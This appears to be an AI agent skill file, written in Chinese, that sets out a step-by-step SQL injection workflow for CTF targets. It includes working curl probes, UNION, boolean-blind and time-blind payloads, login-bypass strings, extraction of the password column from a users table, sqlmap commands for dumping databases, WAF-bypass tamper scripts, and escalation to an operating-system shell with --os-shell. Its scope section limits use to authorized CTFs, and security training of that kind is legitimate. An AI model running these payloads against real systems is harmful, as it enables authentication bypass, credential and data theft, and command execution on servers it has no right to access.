---
name: sqli
description: "通过 UNION、报错、布尔盲注、时间盲注等技术检测和利用 SQL 注入漏洞，提取数据库敏感数据并尝试提权。当目标存在数据库查询、搜索功能、登录表单、URL 参数或 HTTP 头注入点时使用。"
allowed-tools: Bash, Read, Write
---

# SQL 注入 (SQL Injection)

通过在用户输入中注入 SQL 代码，操纵数据库查询，实现数据泄露、认证绕过或命令执行。

## 安全与范围

- **仅在授权 CTF 环境中使用**，确认目标在比赛范围内
- **停止条件**：已获取 flag、已确认无注入点、已穷尽所有注入技术
- **升级条件**：遇到未知 WAF 或异常防护机制时，请求顾问协助
- **文件写入前**：确认目标路径可写且不会破坏环境稳定性
- **命令执行前**：优先使用只读查询，仅在需要提权或获取 flag 时执行系统命令

## 工作流程

```
发现参数 → 检测注入点 → 判断数据库类型 → 选择注入技术 → 提取数据 → 尝试提权
```

### 决策流程图

1. **发现可疑参数** → 执行基础测试（单引号、逻辑测试）
2. **有报错信息？**
   - 是 → 判断数据库类型 → 尝试报错注入
   - 否 → 继续步骤 3
3. **页面有差异？**（AND 1=1 vs AND 1=2）
   - 是 → 布尔盲注
   - 否 → 继续步骤 4
4. **时间盲注测试**（SLEEP/pg_sleep/WAITFOR DELAY）
   - 有延迟 → 时间盲注
   - 无延迟 → 无注入点，尝试其他参数或技术
5. **确认注入后** → 尝试 UNION 注入确定列数
6. **UNION 可用？**
   - 是 → UNION 注入提取数据
   - 否 → 使用已确认的盲注技术
7. **[验证点]** 确认已获取有效数据后 → 尝试提权或读取 flag

## 常见指示器

- URL 参数（id=, page=, search=, sort=, order=）
- 搜索框、登录表单
- Cookie 中的参数
- HTTP 头（User-Agent, Referer, X-Forwarded-For）
- JSON/XML 请求体中的参数
- 数字型或字符串型参数

## 检测方法

### 1. 基础测试

```bash
# 单引号测试
curl "http://target.com/page?id=1'"

# 双引号测试
curl "http://target.com/page?id=1\""

# 注释测试
curl "http://target.com/page?id=1--"
curl "http://target.com/page?id=1#"

# 逻辑测试
curl "http://target.com/page?id=1 AND 1=1"
curl "http://target.com/page?id=1 AND 1=2"
```

**[验证点]** 比较响应差异：报错信息、页面内容变化、HTTP 状态码。无差异则该参数可能不存在注入。

### 2. 时间盲注测试

```bash
# MySQL
curl "http://target.com/page?id=1 AND SLEEP(5)"

# PostgreSQL
curl "http://target.com/page?id=1; SELECT pg_sleep(5)"

# MSSQL
curl "http://target.com/page?id=1; WAITFOR DELAY '0:0:5'"
```

**[验证点]** 测量响应时间。延迟 >= 4 秒即确认时间盲注存在。同时根据哪个 payload 生效来判断数据库类型。

## 攻击向量

### UNION 注入

```sql
-- 确定列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- 确定显示位
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--

-- 提取数据
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,column_name,3 FROM information_schema.columns--

-- 信息收集（MySQL）
' UNION SELECT @@version,user(),database()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
```

### 报错注入

参见数据库特定语法：[MYSQL.md](MYSQL.md)、[POSTGRESQL.md](POSTGRESQL.md)、[MSSQL.md](MSSQL.md)

### 布尔盲注

```sql
-- 判断条件
' AND 1=1--  (正常)
' AND 1=2--  (异常)

-- 逐字符提取
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--

-- 二分法
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--
```

### 时间盲注

参见数据库特定语法：[MYSQL.md](MYSQL.md)、[POSTGRESQL.md](POSTGRESQL.md)、[MSSQL.md](MSSQL.md)

### 堆叠查询

参见数据库特定语法：[MYSQL.md](MYSQL.md)、[POSTGRESQL.md](POSTGRESQL.md)、[MSSQL.md](MSSQL.md)

**[验证点]** 堆叠查询可执行写操作（INSERT/UPDATE/DELETE）。执行前确认操作必要性，优先使用 SELECT 只读查询。

### 认证绕过

```sql
-- 登录绕过
admin'--
admin'#
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1--
admin' OR '1'='1
' OR ''='
') OR ('1'='1
') OR ('1'='1'--

-- 密码字段绕过
' OR '1'='1
anything' OR '1'='1'--
```

## sqlmap 使用

### 基础用法

```bash
# 自动检测
sqlmap -u "http://target.com/page?id=1" --batch

# 指定参数
sqlmap -u "http://target.com/page?id=1" -p id --batch

# POST 请求
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# Cookie 注入
sqlmap -u "http://target.com/page" --cookie="id=1" -p id --batch
```

### 数据提取

```bash
# 列出数据库
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# 列出表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables --batch

# 列出列
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns --batch

# 导出数据
sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump --batch
```

**[验证点]** 导出数据后，检查是否包含 flag 格式的字符串。如果未找到，继续枚举其他表。

### 高级选项

```bash
# 指定数据库类型
sqlmap -u "http://target.com/page?id=1" --dbms=mysql --batch

# 指定注入技术
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
sqlmap -u "http://target.com/page?id=1" --technique=BEUST --batch

# 绕过 WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between --batch

# 提权
sqlmap -u "http://target.com/page?id=1" --os-shell --batch
sqlmap -u "http://target.com/page?id=1" --sql-shell --batch
```

**[验证点]** 使用 `--os-shell` 前，确认已穷尽数据库层面的数据提取。系统命令执行是最后手段。

## 绕过技术

### 空格绕过

```sql
-- 注释替代
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- Tab
SELECT%0ausername%0aFROM%0ausers  -- 换行

-- 括号
SELECT(username)FROM(users)
```

### 引号绕过

```sql
-- 十六进制
SELECT * FROM users WHERE username=0x61646d696e  -- 'admin'

-- CHAR 函数
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)
```

### 关键字绕过

```sql
-- 大小写混合
SeLeCt, UnIoN, FrOm

-- 双写
SELSELECTECT, UNUNIONION

-- 编码
%53%45%4c%45%43%54  -- SELECT

-- 注释分割
SEL/**/ECT, UN/**/ION
```

### WAF 绕过 Tamper 脚本

```bash
# 常用 tamper
--tamper=space2comment      # 空格转注释
--tamper=between            # 使用 BETWEEN 替代 >
--tamper=randomcase         # 随机大小写
--tamper=charencode         # URL 编码
--tamper=equaltolike        # = 转 LIKE
--tamper=space2plus         # 空格转 +
--tamper=space2randomblank  # 空格转随机空白字符
```

## 数据库特定语法

详细的数据库特定语法参考已拆分为独立文件：

- [MySQL 语法参考](MYSQL.md) — 信息收集、文件操作、报错注入、时间盲注、堆叠查询
- [PostgreSQL 语法参考](POSTGRESQL.md) — 信息收集、文件操作、命令执行、报错注入
- [MSSQL 语法参考](MSSQL.md) — 信息收集、命令执行（xp_cmdshell）、报错注入

## 最佳实践

1. **[验证点]** 先用单引号测试是否存在注入点，确认响应异常后再继续
2. 确定数据库类型（通过报错信息或特定函数）
3. 确定注入类型（UNION、报错、盲注）
4. 使用 sqlmap 自动化利用
5. 如果 sqlmap 失败，手工构造 payload
6. 注意 WAF 绕过，使用 tamper 脚本
7. **[验证点]** 提取敏感数据后检查是否包含 flag，确认后再尝试提权（os-shell）
